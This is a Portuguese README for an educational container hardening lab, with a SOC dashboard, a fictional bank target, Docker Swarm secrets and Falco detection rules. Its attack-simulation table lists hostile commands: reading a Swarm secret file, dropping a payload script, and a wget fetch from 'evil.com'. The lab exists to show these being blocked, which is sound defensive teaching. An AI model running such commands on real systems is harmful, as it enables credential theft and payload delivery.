<h1 align="center">Container Hardening & Monitoring Lab</h1>

<p align="center">
  <strong>SOC Dashboard + Target App — Simulação visual de ataques e defesas em containers endurecidos</strong>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Docker_Swarm-2496ED?style=for-the-badge&logo=docker&logoColor=white" alt="Docker Swarm">
  <img src="https://img.shields.io/badge/Python_3.12-3776AB?style=for-the-badge&logo=python&logoColor=white" alt="Python">
  <img src="https://img.shields.io/badge/Falco_SIEM-00AEC7?style=for-the-badge&logo=falco&logoColor=white" alt="Falco">
  <img src="https://img.shields.io/badge/Flask_3.0-000000?style=for-the-badge&logo=flask&logoColor=white" alt="Flask">
  <img src="https://img.shields.io/badge/MITRE_ATT%26CK-FF0000?style=for-the-badge" alt="MITRE">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/hardening-8%2F8_checks-brightgreen?style=flat-square" alt="Checks">
  <img src="https://img.shields.io/badge/attack_vectors-4_simulations-red?style=flat-square" alt="Attacks">
  <img src="https://img.shields.io/badge/apps-SOC_+_NexBank-blue?style=flat-square" alt="Apps">
  <img src="https://img.shields.io/badge/license-MIT-blue?style=flat-square" alt="License">
</p>

---

## Conceito

Duas aplicações web rodam dentro de um **único container Docker endurecido** no Docker Swarm:

| URL | Aplicação | Função |
|-----|-----------|--------|
| [`localhost:5000`](http://localhost:5000) | **SOC Dashboard** | Painel de operações de segurança — monitora, ataca e analisa |
| [`localhost:5000/site`](http://localhost:5000/site) | **NexBank** | Site bancário fictício — o "alvo" sendo protegido |

Quando você lança um ataque no SOC, o NexBank mostra um **banner de alerta em tempo real** dentro do iframe. O resultado aparece inline com comando, regra Falco acionada, código MITRE ATT&CK e veredicto (bloqueado/detectado).

---

## Screenshots

<p align="center">
<img width="1870" height="935" alt="docker1" src="https://github.com/user-attachments/assets/049076cc-893c-4afe-9434-2fe37c07fd84" />
  <em>SOC Dashboard — Score de segurança, verificações ao vivo, cards de ataque e log terminal</em>
</p>

<p align="center">
<img width="1865" height="936" alt="docker2" src="https://github.com/user-attachments/assets/bd88f1ae-b915-4c9b-9038-9faca9623287" />
  <em>NexBank — Site alvo monitorado com banner de ataque detectado</em>
</p>

<p align="center">
<img width="1860" height="928" alt="docker3" src="https://github.com/user-attachments/assets/4784910b-f42a-4267-aa4b-7ed60632c865" />
  <em>Resultado de ataque — Comando, regra Falco, MITRE ATT&CK e detalhe</em>
</p>

---

## Arquitetura

```
┌─────────────────────────────────────────────────────────────────────┐
│                        DOCKER SWARM (mTLS)                          │
│                                                                     │
│  ┌──────────────────────────────┐    ┌───────────────────────────┐  │
│  │     app (Flask + Gunicorn)    │    │    falco (SIEM Monitor)   │  │
│  │                               │    │                           │  │
│  │  / ─── SOC Dashboard         │    │  eBPF syscall tracing     │  │
│  │  /site ─── NexBank (target)  │    │  Custom rules (YAML)      │  │
│  │  /api/* ─── REST endpoints   │    │  MITRE ATT&CK mapping     │  │
│  │  /healthz ─── Swarm health   │    │                           │  │
│  │                               │    │  Detecta:                 │  │
│  │  UID: 10001 (non-root)       │    │  • Acesso a /run/secrets  │  │
│  │  Filesystem: READ-ONLY       │    │  • Shell spawn            │  │
│  │  No wget/curl/netcat         │    │  • Write em filesystem    │  │
│  │  Secret: /run/secrets/       │───>│  • Network tools          │  │
│  │  CPU: 0.50 | RAM: 256M      │    │  CPU: 0.50 | RAM: 512M    │  │
│  └──────────────────────────────┘    └───────────────────────────┘  │
│               │                                                      │
│      Rede overlay (encrypted, mTLS)                                 │
│      Secrets: arquivo em /run/secrets (nunca ENV)                   │
└─────────────────────────────────────────────────────────────────────┘
         │
    ┌────┴────┐
    │ Browser │  http://localhost:5000
    └─────────┘
```

---

## Stack Tecnológico

| Tecnologia | Versão | Papel |
|-----------|--------|-------|
| **Docker Swarm** | 29+ | Orquestração com mTLS nativo, Secrets, healthcheck, resource limits |
| **Python** | 3.12.4 | Runtime do backend (imagem slim-bookworm) |
| **Flask** | 3.0.3 | Framework web para SOC Dashboard + NexBank + REST API |
| **Falco** | 0.38.1 | Runtime security via eBPF — detecta anomalias em syscalls |
| **MITRE ATT&CK** | — | Framework de classificação de ameaças (T1552, T1059, T1105) |

---

## Controles de Segurança

### Dockerfile (8 controles)

| # | Controle | Detalhe |
|---|----------|---------|
| 1 | **Multi-stage build** | Stage `builder` isolado; apenas artefatos copiados para produção |
| 2 | **Usuário non-root** | `appuser` UID 10001, sem home, sem login shell |
| 3 | **Imagem base pinada** | `python:3.12.4-slim-bookworm` — nunca `latest` |
| 4 | **Network tools removidos** | `wget`, `curl`, `netcat` purgados da imagem |
| 5 | **Bytecode pré-compilado** | `compileall` no build + `PYTHONDONTWRITEBYTECODE=1` |
| 6 | **Filesystem read-only** | `read_only: true` no stack.yml — malware não grava |
| 7 | **Healthcheck HTTP** | `GET /healthz` a cada 30s — Swarm substitui containers unhealthy |
| 8 | **Resource limits** | CPU 0.50 / RAM 256M — previne fork bomb e cryptominer |

### Swarm Secrets

- Montados como **arquivo** em `/run/secrets/` com permissão **0400**
- UID/GID = `10001` (apenas o processo da app lê)
- Declaração `external: true` — deve existir antes do deploy
- **Nunca** via variável de ambiente (previne vazamento em `docker inspect`)

### Regras Falco

| Regra | Severity | MITRE | Trigger |
|-------|----------|-------|---------|
| Unauthorized Access to Swarm Secrets | **CRITICAL** | T1552.001 | Processo não-Python lendo `/run/secrets/` |
| Shell Spawned in Hardened Container | **WARNING** | T1059 | Abertura de `bash`/`sh` no container |

---

## Simulações de Ataque

| Vetor | Comando | MITRE | Defesa |
|-------|---------|-------|--------|
| **Roubo de Credenciais** | `cat /run/secrets/db_password` | T1552.001 | Falco CRITICAL + permissão 0400 |
| **Shell Interativo** | `docker exec <id> sh` | T1059 | Falco WARNING + bash removido |
| **Dropper de Malware** | `echo payload > /app/mal.sh` | T1105 | Filesystem read-only (EROFS) |
| **Exfiltração via rede** | `wget http://evil.com/payload` | T1105 | Network tools removidos |

---

## Quick Start

```bash
# Clone
git clone https://github.com/seu-usuario/container-hardening-lab.git
cd container-hardening-lab

# Setup (Swarm + Secret + Build)
make setup        # ou: bash scripts/setup.sh

# Deploy
make deploy       # ou: docker stack deploy -c deploy/stack.yml hardening-lab

# Acesse
# SOC Dashboard:  http://localhost:5000
# NexBank Target: http://localhost:5000/site

# Cleanup
make clean
```

<details>
<summary><strong>Comandos sem make (PowerShell/Windows)</strong></summary>

```powershell
docker swarm init
"MinhaS3nh4Segura2024" | docker secret create db_password -
docker build -t hardening-lab/app:1.0.0 .
docker volume create falco-rules
docker volume create falco-config
docker stack deploy -c deploy/stack.yml hardening-lab

# Abra http://localhost:5000

# Para limpar:
docker stack rm hardening-lab
docker secret rm db_password
docker volume rm falco-rules falco-config
docker swarm leave --force
```

</details>

---

## Estrutura do Projeto

```
container-hardening-lab/
├── Dockerfile                    # Multi-stage hardened build
├── Makefile                      # Automação (setup/deploy/test/clean)
├── README.md                     # Este arquivo
├── README-TUTORIAL.md            # Guia passo-a-passo para iniciantes
├── src/
│   ├── app.py                    # Flask backend (SOC + NexBank + API)
│   ├── requirements.txt          # Deps pinadas (Flask 3.0.3)
│   └── templates/
│       ├── index.html            # SOC Dashboard (dark theme, JS vanilla)
│       └── site.html             # NexBank target site (banking UI)
├── deploy/
│   └── stack.yml                 # Docker Swarm stack definition
├── configs/falco/
│   ├── falco.yaml                # Falco engine config (modern_ebpf)
│   └── rules.local.yaml          # Custom detection rules
├── scripts/
│   ├── setup.sh                  # Environment bootstrap
│   └── test-attack.sh            # CLI attack simulation
└── docs/                         # Screenshots for README
```

---

## Licença

MIT
